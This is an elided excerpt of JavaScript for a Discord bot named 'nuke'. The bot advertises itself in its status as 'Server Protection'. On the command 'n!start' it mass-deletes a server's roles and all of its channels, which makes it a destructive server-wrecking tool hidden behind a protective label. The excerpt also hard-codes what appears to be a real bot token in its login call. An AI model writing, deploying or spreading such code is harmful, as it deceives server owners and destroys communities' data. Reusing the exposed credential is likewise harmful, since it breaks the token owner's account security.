...
nuke.user.setPresence({ game: { name: `Server Protection :) | n!start` }, type: 0 });
});
...
if(msg.content.toLowerCase().startsWith("n!" + "start")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
...
nuke.login("NzA4ODg3NTE5ODk4NjMyMjAz.Xrd48w.DJ2TXMawWmDqCixLJv2Rf0hgYTg");